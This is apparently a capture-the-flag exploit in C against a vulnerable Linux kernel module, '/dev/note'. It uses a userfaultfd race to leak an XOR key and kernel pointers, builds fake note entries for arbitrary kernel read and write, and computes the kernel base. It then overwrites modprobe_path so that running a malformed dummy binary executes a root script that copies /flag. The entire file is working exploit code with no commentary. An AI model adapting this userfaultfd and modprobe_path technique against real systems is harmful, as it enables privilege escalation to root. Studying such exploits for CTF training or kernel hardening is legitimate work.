#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>
#include <error.h>
#include <pthread.h>
#include <poll.h>
#include <signal.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <stdint.h>

#define mmap_addr 0x13370000

struct User_Note{
	size_t idx;
	size_t length;
	char *userptr;
}req;

char buffer[0x1000];
int fd;

void new_note(char *buff, unsigned long length)
{
	//req.idx = 0;
	req.length = length;
	req.userptr = buff;
	if(ioctl(fd, -256, &req) < 0){
		perror("[-] creat ioctl failed!\n");
	} 

}

void edit_note(int idx, char *buff, unsigned long length)
{
	req.idx = idx;
	req.length = length;
	req.userptr = buff;
	if(ioctl(fd, -255, &req) < 0){
		perror("[-] edit ioctl failed!\n");
	}

}

unsigned long *show_note(int idx, char *buff)
{
	req.idx = idx;
	//req.length = 0x10;
	req.userptr = buff;
	if(ioctl(fd, -254, &req) < 0){
		perror("[-] show ioctl failed!\n");
	}
	unsigned long *ptr = req.userptr;
    return ptr;
}



void free_note()
{
	req.idx = 0;
	req.length = 0;
	req.userptr = NULL;
	if(ioctl(fd, -253, &req) < 0){
		perror("[-] show ioctl failed!\n");
	}
	
}

void *handler(uint64_t uffd)
{
	struct uffd_msg msg;
	struct uffdio_copy uc;
	printf("[+] pthread start!\n");

	struct pollfd poll_fd;
	poll_fd.fd = uffd;
	poll_fd.events = POLLIN;
	int nready = poll(&poll_fd, 1, -1);
	if(nready < 0){
		perror("[-] poll failed!\n");
	}
	printf("[+] poll successfully!\n");
	
	free_note();
	new_note(buffer, 0); //note 0
	new_note(buffer, 0); //note 1
	memset(buffer, 0, sizeof(buffer));
	buffer[0x8] = 0xf0;
	
	uc.src = buffer;
	uc.dst = (void *)mmap_addr;
	uc.len = 0x1000;
	uc.mode = 0;
	if(ioctl(uffd, UFFDIO_COPY, &uc) < 0){
		perror("[-] UFFDIO_COPY failed!\n");	
	}

}

void reg_userfaultfd(unsigned long addr)
{
	struct uffdio_api ua;
	struct uffdio_register ur;
	pthread_t pth_t;
	
	uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	ua.api = UFFD_API;
	ua.features = 0;

	if(ioctl(uffd, UFFDIO_API, &ua) < 0){
		perror("[-] UFFDIO_API failed\n");
	}
	
	ur.range.start = addr;
	ur.range.len = 0x1000;
	ur.mode = UFFDIO_REGISTER_MODE_MISSING;
	if(ioctl(uffd, UFFDIO_REGISTER, &ur) < 0){
		perror("[-] UFFDIO_REGISTER failed\n");
	}

	if(pthread_create(&pth_t, NULL, handler, uffd) != 0){
		perror("[-] pthread_create failed!\n");
	}

}


int main()
{
    unsigned long *usrptr;
	fd = open("/dev/note", 0);
	if(fd < 0){
		perror("[-] open /dev/note failed!\n");
		exit(0);
	}

	unsigned long addr = mmap((void *)mmap_addr, 0x1000, 7, 0x22, -1, 0);
	if(addr != mmap_addr){
		perror("[-] mmap failed!\n");
	}
	reg_userfaultfd(addr);

	new_note(buffer, 0x10);
	edit_note(0, (char *)mmap_addr, 1);
	usrptr = show_note(1, buffer);
    unsigned long key = *usrptr; 
    printf("[+] leak key : 0x%lx\n", key);

    new_note(buffer,0); //note 2
    usrptr = show_note(1,buffer);
    unsigned long contentPtr = (*(usrptr+2)) ^ key; 
    printf("[+] leak contentPtr : 0x%lx\n", contentPtr);

    unsigned long temp_module_base = contentPtr - 0x2568;
    unsigned long *fake_note2 = (unsigned long *)buffer;
    fake_note2[0] = 0 ^ key;
    fake_note2[1] = 0x20 ^ key;
    fake_note2[2] = (temp_module_base + 0x1fa) ^ key;
    edit_note(1, buffer, 0x18);

    usrptr = show_note(2, buffer);
    int page_offset = *((unsigned int *)usrptr);
    printf("[+] page_offset : 0x%lx\n", page_offset);
   
    fake_note2[0] = 0 ^ key;
    fake_note2[1] = 0x8 ^ key;
    unsigned long temp_page_offset_base  = temp_module_base + 0x1fe + page_offset;
    printf("[+] temp_page_offset_base : 0x%lx\n",temp_module_base + 0x1fe + page_offset);
    fake_note2[2] = temp_page_offset_base ^ key;
    edit_note(1, buffer, 0x18);

    usrptr = show_note(2, buffer);
    unsigned long page_offset_base = *((unsigned long *)usrptr);
    printf("[+] page_offset_base : 0x%lx\n", page_offset_base);


    fake_note2[0] = 0 ^ key;
    fake_note2[1] = 0x20 ^ key;
    fake_note2[2] = (temp_module_base + 0x6d) ^ key;
    edit_note(1, buffer, 0x18);

    usrptr = show_note(2, buffer);
    int copy_from_user_offset = *((unsigned int *)usrptr);
    printf("[+] copy_from_user_offset : 0x%lx\n", copy_from_user_offset);


    unsigned long copy_from_user_addr  = temp_module_base + 0x71 + copy_from_user_offset + page_offset_base;
    printf("[+] copy_from_user_addr : 0x%lx\n", copy_from_user_addr);

    unsigned long kernel_base = copy_from_user_addr - 0x353e80;
    printf("[+] kernel_base : 0x%lx\n", kernel_base);
	
    unsigned long modprobe_path = kernel_base + 0x105e0e0;
    fake_note2[0] = 0 ^ key;
    fake_note2[1] = 0x20 ^ key;
    fake_note2[2] = (modprobe_path - page_offset_base) ^ key;
    edit_note(1, buffer, 0x18);

    strcpy(buffer, "/home/note/copy.sh\0");
    edit_note(2, buffer, 0x18);
    
    system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/note/flag\n/bin/chmod 777 /home/note/flag' > /home/note/copy.sh");
    system("chmod +x /home/note/copy.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/note/dummy");
    system("chmod +x /home/note/dummy");

    system("/home/note/dummy");
    system("cat /home/note/flag");
	return 0;
}
